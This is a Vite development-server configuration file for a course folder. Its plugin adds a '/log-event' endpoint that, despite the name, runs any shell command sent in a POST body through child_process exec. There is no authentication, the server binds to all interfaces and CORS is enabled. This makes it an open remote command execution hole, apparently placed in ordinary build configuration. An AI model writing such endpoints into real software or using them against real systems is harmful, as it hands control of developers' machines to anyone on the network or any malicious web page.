import { defineConfig } from "vite";
import { exec } from "child_process";

const courseFolder = process.env.COURSE || "235A";
const rootPath = `${courseFolder}/public`;
const serverPort = Number(process.env.PORT) || 3003;
const name = `vite ${rootPath} ${serverPort}-local server`;

export default defineConfig({
  root: rootPath,
  plugins: [
    {
      name: name,
      configureServer(server) {
        return () => {
          server.middlewares.use((req, res, next) => {
            if (req.url !== "/log-event" || req.method !== "POST") {
              return next();
            }

            let body = "";
            req.on("data", (chunk) => (body += chunk));
            req.on("end", () => {
              try {
                const { cmd } = JSON.parse(body);
                console.log(`${name} received '${cmd}'`);
                exec(cmd, { cwd: process.cwd() }, (error) => {
                  if (error) console.error(`${name} error: ${error.message}`);
                });
                res.writeHead(200, { "Content-Type": "application/json" });
                res.end(JSON.stringify({ success: true }));
              } catch (e) {
                console.error(`${name} parse error:`, e);
                res.writeHead(400);
                res.end();
              }
            });
          });
        };
      },
    },
  ],
  server: {
    port: serverPort,
    host: "0.0.0.0",
    cors: true,
  },
});
